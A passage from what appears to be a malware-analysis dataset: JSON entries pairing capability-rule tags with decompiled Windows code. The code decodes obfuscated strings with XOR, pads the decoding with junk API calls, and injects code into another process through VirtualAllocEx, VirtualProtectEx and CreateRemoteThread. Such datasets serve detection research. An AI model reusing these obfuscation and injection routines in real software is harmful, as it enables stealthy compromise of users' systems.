*(iVar8 + piVar4) = *(&var_20h + iVar8 % 5) ^ (iVar8 + piVar4)[&var_2ch - piVar4];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 10);\n            piVar6 = piVar4;\n            do {\n                iVar1 = *piVar6;\n                *((var_10h - piVar4) + piVar6) = iVar1;\n                pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        iVar8 = fcn.00401041(var_8h);\n        if (iVar8 == 0) {\n            iVar8 = fcn.00406361();\n            if (iVar8 != 0) {\n                iVar7 = 1;\n            }\n        }\n        if (iVar2 != 0) {\n            uVar3 = (*pcVar9)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        uVar3 = (*pcVar9)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar7;\n}\n",
        "token_count": 828
    },
    "004069ca": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004069ca(uchar *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_28h = param_1;\n    if ((((*0x41db20 | *0x41db24) == 0) || ((*0x41db28 | *0x41db2c) == 0)) || ((*0x41db30 | *0x41db34) == 0)) {\n        var_4h = 0x7f;\n        var_24h = 0x342e153f;\n        var_20h = 0xd357a39;\n        var_1ch._0_2_ = 0x5826;\n        var_30h = 0x584a6151;\n        var_2ch._0_2_ = 0x5455;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_14h = iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n            if (iVar3 != 0x4733ae) {\n                var_18h = 6;\n                *(iVar6 + iVar2) = *(&var_30h + iVar6 % 6) ^ (iVar6 + iVar2)[&var_24h - iVar2];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 10);\n        var_10h = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar2);\n        if (var_10h == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            return var_4h;\n        }\n        var_34h = 0x1e310c7a;\n        var_30h = 0x70c575e;\n        var_2ch._0_2_ = 0x5d3e;\n        var_2ch._2_1_ = 0x36;\n        var_20h = 0x52436836;\n        var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x31);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_ch = 5;\n        iVar6 = 0;\n        var_18h = iVar2;\n        var_8h = &var_34h - iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            if (iVar3 != 0x71ab4d) {\n                *(iVar6 + iVar2) = *(&var_20h + iVar6 % var_ch) ^ (iVar6 + iVar2)[&var_34h - iVar2];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0xb);\n        *0x41db20 = fcn.0040268f();\n        iVar6 = var_14h;\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        *0x41db24 = *0x41db20 >> 0x1f;\n        if ((*0x41db20 | *0x41db24) == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_4ch = 0x24151624;\n            var_48h = 0x15221c1f;\n            var_44h = 0x160d190c;\n            var_40h = 0x291f1112;\n            var_3ch = 0x1f110316;\n            var_38h._0_2_ = 0x11b;\n            var_38h._2_1_ = 0x67;\n            var_30h = 0x63677268;\n            var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x7a);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_20h = &var_4ch - iVar2;\n            var_8h = iVar2;\n            do {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                if (iVar3 != 0x13c24d) {\n                    *(iVar6 + iVar2) = *(&var_30h + iVar6 % var_ch) ^ (iVar6 + iVar2)[&var_4ch - iVar2];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x17);\n            *0x41db28 = fcn.0040268f();\n            iVar6 = var_14h;\n            iVar2 = var_18h;\n            *0x41db2c = *0x41db28 >> 0x1f;\n            if ((*0x41db28 | *0x41db2c) == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar4)(uVar1);\n                uVar1 = (*pcVar7)(0, iVar6);\n                (*pcVar4)(uVar1);\n                return var_4h;\n            }\n            var_4ch = 0x26013202;\n            var_48h = 0x32202c0c;\n            var_44h = 0x37313520;\n            var_40h = 0x34022125;\n            var_3ch = 0xc393408;\n            var_38h._0_2_ = 0x3c2a;\n            var_38h._2_1_ = 0x51;\n            var_30h = 0x54514558;\n            var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 99);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_20h = &var_4ch - iVar2;\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n                if (iVar3 != 0xad63d) {\n                    *(iVar6 + iVar2) = *(&var_30h + iVar6 % var_ch) ^ (iVar6 + iVar2)[&var_4ch - iVar2];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x17);\n            *0x41db30 = fcn.0040268f();\n            iVar6 = var_14h;\n            pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            *0x41db34 = *0x41db30 >> 0x1f;\n            if ((*0x41db30 | *0x41db34) != 0) {\n                var_4h = 0;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar4)(0, var_8h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar4)(0, var_18h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar4)(0, iVar6);\n                (*pcVar7)(uVar1);\n                goto code_r0x00406d04;\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar4)(0, var_8h);\n            (*pcVar7)(uVar1);\n            uVar1 = (*pcVar4)(0, var_18h);\n        }\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar4)(0, iVar6);\n        (*pcVar7)(uVar1);\n    }\n    else {\ncode_r0x00406d04:\n        puVar5 = 0x41db20;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_28h = *puVar5;\n            puVar5 = puVar5 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2351
    },
    "00406d1a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00406d1a(uchar *param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_28h = param_1;\n    if ((((*0x41db38 | *0x41db3c) == 0) || ((*0x41db40 | *0x41db44) == 0)) || ((*0x41db48 | *0x41db4c) == 0)) {\n        var_4h = 0x7f;\n        var_24h = 0x342e153f;\n        var_20h = 0xd357a39;\n        var_1ch._0_2_ = 0x5826;\n        var_30h = 0x584a6151;\n        var_2ch._0_2_ = 0x5455;\n        var_14h = param_2;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar7 = 0;\n        var_10h = iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n            if (iVar3 != 0x4733ae) {\n                var_18h = 6;\n                *(iVar7 + iVar2) = *(&var_30h + iVar7 % 6) ^ (iVar7 + iVar2)[&var_24h - iVar2];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 10);\n        var_34h = 0x1e310c7a;\n        var_30h = 0x70c575e;\n        var_2ch._0_2_ = 0x5d3e;\n        var_2ch._2_1_ = 0x36;\n        var_20h = 0x52436836;\n        var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x31);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_ch = 5;\n        iVar7 = 0;\n        var_18h = iVar2;\n        var_8h = &var_34h - iVar2;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            iVar3 = var_10h;\n            if (iVar4 != 0x71ab4d) {\n                *(iVar7 + iVar2) = *(&var_20h + iVar7 % var_ch) ^ (iVar7 + iVar2)[&var_34h - iVar2];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xb);\n        *0x41db38 = fcn.004020bd(iVar2);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (*0x41db38 == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_4ch = 0x24151624;\n            var_48h = 0x15221c1f;\n            var_44h = 0x160d190c;\n            var_40h = 0x291f1112;\n            var_3ch = 0x1f110316;\n            var_38h._0_2_ = 0x11b;\n            var_38h._2_1_ = 0x67;\n            var_30h = 0x63677268;\n            var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x7a);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            var_20h = &var_4ch - iVar2;\n            var_8h = iVar2;\n            do {\n                iVar4 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                iVar3 = var_10h;\n                if (iVar4 != 0x13c24d) {\n                    *(iVar7 + iVar2) = *(&var_30h + iVar7 % var_ch) ^ (iVar7 + iVar2)[&var_4ch - iVar2];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41db40 = fcn.004020bd(iVar2);\n            iVar2 = var_18h;\n            if (*0x41db40 == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar5)(uVar1);\n                uVar1 = (*pcVar8)(0, iVar3);\n                (*pcVar5)(uVar1);\n                goto code_r0x00407048;\n            }\n            var_4ch = 0x26013202;\n            var_48h = 0x32202c0c;\n            var_44h = 0x37313520;\n            var_40h = 0x34022125;\n            var_3ch = 0xc393408;\n            var_38h._0_2_ = 0x3c2a;\n            var_38h._2_1_ = 0x51;\n            var_30h = 0x54514558;\n            var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 99);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            var_20h = &var_4ch - iVar2;\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n                iVar3 = var_10h;\n                if (iVar4 != 0xad63d) {\n                    *(iVar7 + iVar2) = *(&var_30h + iVar7 % var_ch) ^ (iVar7 + iVar2)[&var_4ch - iVar2];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41db48 = fcn.004020bd(iVar2);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (*0x41db48 != 0) {\n                var_4h = 0;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_8h);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, var_18h);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar3);\n                (*pcVar8)(uVar1);\n                goto code_r0x0040703b;\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar5)(0, var_8h);\n            (*pcVar8)(uVar1);\n            uVar1 = (*pcVar5)(0, var_18h);\n        }\n        (*pcVar8)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar8)(uVar1);\n    }\n    else {\ncode_r0x0040703b:\n        puVar6 = 0x41db38;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_28h = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\ncode_r0x00407048:\n    *0x41db4c = *0x41db48 >> 0x20;\n    *0x41db44 = *0x41db40 >> 0x20;\n    *0x41db3c = *0x41db38 >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 2282
    },
    "00407219": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00407219(int32_t *arg_8h, int32_t arg_ch, int32_t lpParameter, uint32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    uchar *arg_8h_00;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    int16_t *piVar9;\n    uint uVar10;\n    int32_t iVar11;\n    int32_t unaff_EDI;\n    int64_t iVar12;\n    uint arg_10h;\n    int32_t iVar13;\n    uint *puVar14;\n    uint uVar15;\n    int32_t *piStack144;\n    uint uStack140;\n    int32_t iVar16;\n    uchar *puVar17;\n    uchar *noname_0;\n    uint uStack124;\n    uchar *puStack120;\n    uint32_t uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    ushort uStack84;\n    uchar uStack82;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    uStack140 = 0x40722b;\n    uStack116 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    uStack116 = uStack116 & 0xff;\n    uStack100 = NULL;\n    piVar1 = arg_8h + 1;\n    uStack108 = piVar1;\n    if (*piVar1 != 0) {\n        uStack140 = *piVar1;\n        piStack144 = 0x40724e;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        *piVar1 = 0;\n    }\n    uVar10 = 0xffffffff;\n    if (((arg_14h & 0x10) == 0) && ((*0x41dad8 & 1) != 0)) {\n        puStack120 = 0x5;\n        if (uStack116 == 5) {\n            if ((*0x41e1d8 | *0x41e1dc) == 0) {\n                uStack140 = 0x407298;\n                fcn.004022cf();\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uStack140 = 0xb;\n                piStack144 = 0x8;\n                uStack72 = 0x342e153f;\n                uStack68 = 0xd357a39;\n                uStack64 = CONCAT22(uStack64._2_2_, 0x5826);\n                uStack88 = 0x584a6151;\n                uStack84 = 0x5455;\n                (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                iVar16 = 6;\n                iVar11 = 0;\n                noname_0 = &stack0xffffffac + -piVar4;\n                uStack124 = piVar4;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                    if (iVar5 != 0x4733ae) {\n                        *(iVar11 + piVar4) = (&stack0xffffff9c)[iVar11 % iVar16] ^ (iVar11 + piVar4)[noname_0];\n                    }\n                    iVar11 = iVar11 + 1;\n                } while (iVar11 < 10);\n                uVar15 = 8;\n                uStack68 = 0x1e310c7a;\n                uStack64 = 0x70c575e;\n                uStack60 = uStack60 & 0xff000000 | 0x365d3e;\n                uStack100 = 0x52436836;\n                uStack96 = CONCAT31(uStack96._1_3_, 0x31);\n                iVar11 = (*pcVar8)();\n                arg_8h_00 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                iVar5 = 0;\n                puVar17 = &stack0xffffffb0 + -arg_8h_00;\n                uVar10 = 0xffffffff;\n                uStack140 = arg_8h_00;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n                    if (iVar6 != 0x71ab4d) {\n                        arg_8h_00[iVar5] = (&stack0xffffff90)[iVar5 % piStack144] ^ (arg_8h_00 + iVar5)[puVar17];\n                    }\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < 0xb);\n                iVar5 = iVar16;\n                iVar12 = fcn.004020bd(arg_8h_00);\n                if (iVar12 != 0) {\n                    arg_10h = 8;\n                    uStack80 = 0x692a5a39;\n                    uStack76 = 0x5a3c383d;\n                    uStack72 = 0x3823692a;\n                    uStack68 = 0x692e5a30;\n                    uStack64 = 0x5a37383c;\n                    uStack60 = CONCAT22(uStack60._2_2_, 0x694f);\n                    iStack104 = 0x694f5a52;\n                    uStack100 = CONCAT22(uStack100._2_2_, 0x384f);\n                    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x2d);\n                    piStack144 = iVar12 >> 0x20;\n                    uStack116 = iVar12;\n                    piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                    piStack144 = iVar12 >> 0x20;\n                    uStack116 = iVar12;\n                    iVar6 = 0;\n                    piStack144 = &stack0xffffffa4 + -piVar4;\n                    iVar16 = iVar5;\n                    uStack124 = piVar4;\n                    do {\n                        iVar5 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                        if (iVar5 != 0xa532e7) {\n                            *(iVar6 + piVar4) =\n                                 (&stack0xffffff8c)[iVar6 % iVar11] ^ (iVar6 + piVar4)[&stack0xffffffa4 + -piVar4];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0x16);\n                    arg_8h_00 = 0xc;\n                    iStack56 = piVar4 >> 0x1f;\n                    piVar9 = piVar4;\n                    do {\n                        iVar2 = *piVar9;\n                        piVar9 = piVar9 + 1;\n                    } while (iVar2 != iVar16);\n                    iVar2 = (piVar9 - (piVar4 + 1) >> 1) * 2;\n                    uStack64 = 0;\n                    uStack68 = CONCAT22(iVar2 + 2, iVar2);\n                    uStack60 = piVar4;\n                    iVar5 = fcn.004105e0(noname_0, uVar15, 4, 0, 0, 0, 0, 0, &stack0xffffffbc, &stack0xffffffbc >> 0x1f\n                                         , &stack0xffffff94, &stack0xffffff94 >> 0x1f, uVar10, arg_10h);\n                    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if (iVar5 < 0) {\n                        uVar10 = fcn.00405d7e();\n                    }\n                    else {\n                        uStack92 = 0x5a412239;\n                        uStack88 = 0x52253e11;\n                        uStack84 = 0x1147;\n                        uStack82 = 0x52;\n                        piStack144 = 0x34334752;\n                        uStack140 = CONCAT31(uStack140._1_3_, 0x74);\n                        iVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n                        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                        iVar13 = 0;\n                        uStack140 = &stack0xffffff98 + -iVar6;\n                        do {\n                            iVar7 = (*pcVar8)();\n                            if (iVar7 != 0xe85e4f) {\n                                *(iVar13 + iVar6) = (&stack0xffffff64)[iVar13 % 5] ^ (iVar13 + iVar6)[uStack140];\n                            }\n                            iVar13 = iVar13 + 1;\n                        } while (iVar13 < 0xb);\n                        iStack104 = 0x180a4570;\n                        uStack100 = 0x5261103c;\n                        uStack96 = 0x103c1602;\n                        uStack92 = 0x1c1d5f67;\n                        uStack88 = uStack88 & 0xff000000 | 0x331129;\n                        uStack124 = CONCAT22(uStack124._2_2_, 0x7548);\n                        uVar10 = (*pcVar8)(8, 0x14);\n                        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n                        iVar13 = 0;\n                        arg_8h_00 = &stack0xffffff8c + -iVar6;\n                        uVar10 = 0xffffffff;\n                        do {\n                            iVar7 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                            if (iVar7 != 0x5f31e2) {\n                                *(iVar13 + iVar6) = (&stack0xffffff74)[iVar13 % iVar5] ^ (iVar13 + iVar6)[arg_8h_00];\n                            }\n                            iVar13 = iVar13 + 1;\n                        } while (iVar13 < 0x13);\n                        *0x41e1d8 = fcn.004020bd(iVar6);\n                        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n                        uVar15 = (*pcVar8)(0, iVar11);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n                        piVar4 = uStack124;\n                    }\n                    uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n                    iVar12 = CONCAT44(piStack144, uStack116);\n                }\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h_00);\n                piStack144 = iVar12 >> 0x20;\n                uStack116 = iVar12;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n                piStack144 = iVar12 >> 0x20;\n                uStack116 = iVar12;\n                uVar15 = (*pcVar8)(0, iVar16);\n                piStack144 = iVar12 >> 0x20;\n                uStack116 = iVar12;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n                piStack144 = iVar12 >> 0x20;\n                uStack116 = iVar12;\n                *0x41e1e0 = CONCAT44(*0x41e1e4, *0x41e1e0);\n                if (*0x41e1d8 == 0) goto code_r0x00407aab;\n            }\n            *0x41e1dc = *0x41e1d8 >> 0x20;\n            piStack144 = arg_8h + 3;\n            uStack140 = piStack144 >> 0x1f;\n            iVar16 = fcn.004105e0(*0x41e1d8, *0x41e1dc, 7, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, arg_ch, \n                                  arg_ch >> 0x1f, lpParameter, lpParameter >> 0x1f);\n            arg_8h[1] = iVar16;\n            *0x41e1e0 = CONCAT44(*0x41e1e4, *0x41e1e0);\n            if (iVar16 != 0) {\n                uVar10 = 0;\n                *0x41e1e0 = CONCAT44(*0x41e1e4, *0x41e1e0);\n            }\n        }\n        else {\n            if ((*0x41e1e0 | *0x41e1e4) == 0) {\n                uStack140 = 0xb;\n                piStack144 = 0x8;\n                uStack72 = 0x342e153f;\n                uStack68 = 0xd357a39;\n                uStack64 = CONCAT22(uStack64._2_2_, 0x5826);\n                uStack80 = 0x584a6151;\n                uStack76 = CONCAT22(uStack76._2_2_, 0x5455);\n                iVar16 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                iVar6 = 6;\n                iVar5 = 0;\n                uStack100 = &stack0xffffffac + -iVar11;\n                iStack104 = iVar11;\n                do {\n                    iVar13 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                    if (iVar13 != 0x4733ae) {\n                        *(iVar5 + iVar11) = (&stack0xffffffa4)[iVar5 % iVar6] ^ (iVar5 + iVar11)[uStack100];\n                    }\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < 10);\n                uStack44 = 0xa2d4d11;\n                uStack40 = 0x4d222b46;\n                uStack36 = 0x2b471c24;\n                uStack32 = 0x3b296d31;\n                uStack28 = 0x39272f51;\n                uStack92 = 0x49413943;\n                uStack88 = CONCAT22(uStack88._2_2_, 0x4e34);\n                (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                iVar5 = 0;\n                puStack112 = &stack0xffffffc8 + -iVar11;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                    if (iVar6 != 0x2aa1d) {\n                        *(iVar5 + iVar11) =\n                             (&stack0xffffff98)[iVar5 % iVar16] ^ (iVar5 + iVar11)[&stack0xffffffc8 + -iVar11];\n                    }\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < 0x14);\n                fcn.004022cf();\n                uVar3 = uStack116;\n                uVar10 = 0xffffffff;\n                *0x41e1e0 = fcn.004020bd(iVar11);\n                uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n                uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar3);\n                (*pcVar8)(uVar15);\n                *0x41e1d8 = CONCAT44(*0x41e1dc, *0x41e1d8);\n                if (*0x41e1e0 == 0) goto code_r0x00407aab;\n            }\n            *0x41e1e4 = *0x41e1e0 >> 0x20;\n            uVar10 = 0xffffffff;\n            piStack144 = &stack0xffffffb8;\n            uStack140 = piStack144 >> 0x1f;\n            iVar16 = fcn.004105e0(*0x41e1e0, *0x41e1e4, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0);\n            *0x41e1d8 = CONCAT44(*0x41e1dc, *0x41e1d8);\n            if (-1 < iVar16) {\n                uVar10 = 0;\n                *0x41e1d8 = CONCAT44(*0x41e1dc, *0x41e1d8);\n            }\n        }\n    }\n    else {\n        uStack140 = 0x20;\n        piStack144 = 0x3000;\n        puStack112 = NULL;\n        iVar16 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)();\n        pcVar8 = _sym.imp.KERNEL32.dll_VirtualProtectEx;\n        if (iVar16 == 0) {\n            uStack140 = arg_ch;\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(*arg_8h, iVar16, 5, 0x40);\n            fcn.00407af5(iVar16);\n            fcn.00407ab4(&stack0xffffff74);\n            (*pcVar8)(*arg_8h, iVar16, 5, 0x20, &stack0xffffff60);\n        }\n        if (unaff_EDI == 5) {\n            uVar10 = 0;\n            iVar16 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(*arg_8h, 0, 0, uStack140, lpParameter, 0);\n            arg_8h[1] = iVar16;\n            if (iVar16 == 0) {\n                uVar10 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            else {\n                piStack144 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar16, 30000);\n                *0x41e1e0 = CONCAT44(*0x41e1e4, 